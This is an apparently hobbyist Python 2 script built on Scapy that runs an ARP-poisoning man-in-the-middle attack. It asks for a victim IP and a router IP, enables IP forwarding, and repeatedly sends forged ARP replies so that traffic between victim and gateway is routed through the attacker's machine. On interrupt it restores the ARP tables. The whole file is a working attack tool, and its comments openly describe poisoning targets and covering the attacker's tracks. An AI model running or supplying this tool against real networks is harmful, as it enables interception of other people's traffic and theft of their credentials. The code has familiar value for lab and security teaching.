#!/usr/bin/env python

# a great reference 
#https://webcache.googleusercontent.com/search?q=cache:E9j00tClPXQJ:https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/+&cd=1&hl=en&ct=clnk&gl=us&client=browser-ubuntu

from scapy.all import *

import sys
import os
import time

try:
	interface = raw_input("[*]Enter the Interface you want to use: ")
	victimIP = raw_input("[*]Enter the Victim IP: ")
	gateIP = raw_input("[*]Enter the Router IP: ")
except KeyboardInterrupt:
	print "\n[-] User requested Shutdown..."
	print "[-] Existing..."
	sys.exit(1)

print "\n[*]Enabling IP Forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


#send ARP request with user choice
def get_mac(IP, interface):
	conf.verb=0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2,iface=interface,inter=0.1)
	for send, receive in ans:
#		print receive.sprintf(r"%Ether.src%")
		return receive.sprintf(r"%Ether.src%")

# sned ARP reply to each of targets, telling them that we are the other target.
def trick(gatemac, victimmac):
	send(ARP(op=2, pdst = victimIP, psrc = gateIP, hwdst = victimmac))
	send(ARP(op=2, pdst = gateIP, psrc = victimIP, hwdst = gatemac))

# re-assign the target addresses, to conver our bad beheaviour
def recon():
	print "\n[*]Restoring Tragets..."
	victimmac= get_mac(victimIP, interface)
	gatemac = get_mac(gateIP, interface)
	send(ARP(op=2, pdst = gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=victimmac), count =7)
	send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatemac), count =7)
	print "[*] Disabling IP Forwarding..."
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print "[*] shutting down..."
	sys.exit(1)


def mitm():
	try:
		victimmac = get_mac(victimIP,interface)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[-] Could not find MAC address of victim target!"
		print "[-] Existing ..."
		sys.exit(1)

	try: 
		gatemac = get_mac(gateIP,interface)
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print "[-] Could not find MAC address of gate!"
                print "[-] Existing ..."
                sys.exit(1)
	print "[*] Psisoning Targets..."
	while 1:
		try:
			trick(gatemac, victimmac)
			time.sleep(1.5)
		except KeyboardInterrupt:
			recon()
			break
mitm()
